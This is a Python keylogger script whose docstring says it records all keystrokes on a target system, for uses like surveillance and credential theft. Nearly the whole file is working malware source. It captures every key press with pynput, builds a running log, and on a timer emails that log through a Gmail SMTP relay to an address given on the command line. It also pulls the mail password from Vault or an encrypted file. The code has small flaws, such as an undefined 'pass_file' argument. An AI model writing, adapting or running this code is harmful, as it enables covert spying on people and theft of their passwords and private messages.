#!/usr/bin/env python

import os
import importlib.util
import argparse
import threading
import pynput.keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

"""
    Run the script by providing the required arguments in the following format:
    
    Usage (example):
      python keylogger.py -t 60 -e myemail@gmail.com -p mypassword

    Or, if using Vault:

      python keylogger.py -t 60 -e myemail@gmail.com -p /path/to/vault/secret
      
    Or, if using an encrypted file:
        
      python keylogger.py -t 60 -e myemail@gmail.com -p /path/to/encrypted/file -k encryptionkey
      
    
    This keylogger Python script records all keystrokes on a target system, storing this input data for 
    later retrieval, often used for surveillance or malicious purposes like credential theft.
    
    License:
        MIT License

        Copyright (c) 2023, WildBerry, LLC

        Permission is hereby granted, free of charge, to any person obtaining a copy
        of this software and associated documentation files (the "Software"), to deal
        in the Software without restriction, including without limitation the rights
        to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
        copies of the Software, and to permit persons to whom the Software is
        furnished to do so, subject to the following conditions:

        The above copyright notice and this permission notice shall be included in all
        copies or substantial portions of the Software.

        THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
        IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
        FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
        AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
        LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
        OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
        SOFTWARE.
"""

__author__ = "Marco A. Villarruel"
__authors__ = ["Marco A. Villarruel"]
__contacts__ = ["marco.urquieta@proton.me", "marco@wildberry.us"]
__copyright__ = "Copyright 2023, WildBerry, LLC"
__credits__ = ["Marco A. Villarruel"]
__date__ = "2023/06/15"
__deprecated__ = False
__emails__ = ["marco.urquieta@proton.me", "marco@wildberry.us"]
__license__ = "GPLv3"
__maintainer__ = "developer"
__status__ = "Production"
__version__ = "1.0.0"


def logo():
    print("""
        ___    __    __   __  ____  ____  ___   __   _
       / __)  /__\  (  \_/  )(  _ \( ___)/ _ \ (  \_( )
      ( (__  /(__)\ )  ___  ( )___/ )__)( (_) )) (\ ) (
       \___)(__)(__)(__) (__)(__)  (____)\___/ (_) \__)
 _    _  _____  _     ____   _____  ____  _____  _____  _   _
( )  ( )(__ __)( )   (  _ \ ( (_) \( ___)( (_) )( (_) )( )_( )  
) (/\) ( _( )_ ) (__ ) (_) ))  _  ( )__) ) (\ ( ) (\ (  \   /
(_/  \_)(_____)(____)(____/ (_(_)_/(____)(_) \_)(_) \_)  (_)
        """)


def import_module_from_path(path_to_module):
    spec = importlib.util.spec_from_file_location(
        "module_name", path_to_module)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


class Keylogger:
    def __init__(self, sleep_interval, email, password, secrets_retreiver):
        self.log = ''
        self.sleep_time = sleep_interval
        self.email = email
        self.password = password
        self.secrets_retreiver = secrets_retreiver

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = ' '
            elif key == key.shift or key.backspace:
                current_key = ''
            else:
                current_key = ' ' + str(key) + ' '
        self.append_to_log(current_key)

    def process_key_release(self, key):
        if key == pynput.keyboard.Key.esc:
            # Stop listener
            return False

    def report(self):
        self.send_mail(self.email, self.password, '\n\n' + self.log)
        self.log = ''
        timer = threading.Timer(self.sleep_time, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = email
        msg['Subject'] = 'What I texted, today!'
        msg.attach(MIMEText(message, _subtype='plain', _charset='UTF-8'))

        server = smtplib.SMTP('smtp-relay.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, msg.as_string())
        server.quit()

        self.secrets_retreiver.clear_password(password)

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(
            on_press=self.process_key_press, on_release=self.process_key_release)
        with keyboard_listener as listener:
            self.report()
            listener.join()


if __name__ == "__main__":
    logo()
    parser = argparse.ArgumentParser(
        description="Run a keylogger and send emails")
    parser.add_argument("-t", "--interval", dest="interval", type=int,
                        help="Time interval for reports", required=True)
    parser.add_argument("-e", "--email", dest="email",
                        help="Email for sending reports", required=True)
    parser.add_argument("-p", "--password", dest="password",
                        help="Email password or Vault path or encrypted file path")
    parser.add_argument("-k", "--key", dest="key",
                        help="Encryption key for encrypted file", required=False)
    parser.add_argument("-s", "--smtp", dest="smtp",
                        help="SMTP relay server", default='smtp-relay.gmail.com')
    parser.add_argument("-P", "--port", dest="port", type=int,
                        help="SMTP port", default=587)

    args = parser.parse_args()

    # Get the path to the directory above the current one
    parent_dir = os.path.abspath(os.path.join(os.getcwd(), os.pardir))
    # Build the full path to the module
    module_path = os.path.join(
        parent_dir, "../", "secrets_retreiver", "secrets_retreiver.py")
    # Use the function
    secrets_retreiver = import_module_from_path(module_path)
    secrets_retreiver_class = secrets_retreiver.SecretRetriever()

    # Enter the required parameters for the password manager
    vault_addr = 'https://127.0.0.1:8200'
    vault_token = ''
    secret_path = 'tls/apitest'
    secret_key = 'SMTP_PASSWORD'
    cert_priv = '/tmp/vault/vault.crt'
    cert_key = '/tmp/vault/vault.key'
    cert_auth = '/tmp/vault/vault.ca'

    if args.pass_file and args.key:
        password = secrets_retreiver_class.get_password_from_encrypted_file(
            args.pass_file, args.key)
    else:
        password = secrets_retreiver_class.get_password_from_vault(
            vault_addr,
            vault_token,
            secret_path,
            secret_key,
            cert_priv,
            cert_key,
            cert_auth
        )

    keylogger = Keylogger(args.interval, args.email,
                          password, secrets_retreiver_class)
    keylogger.start()
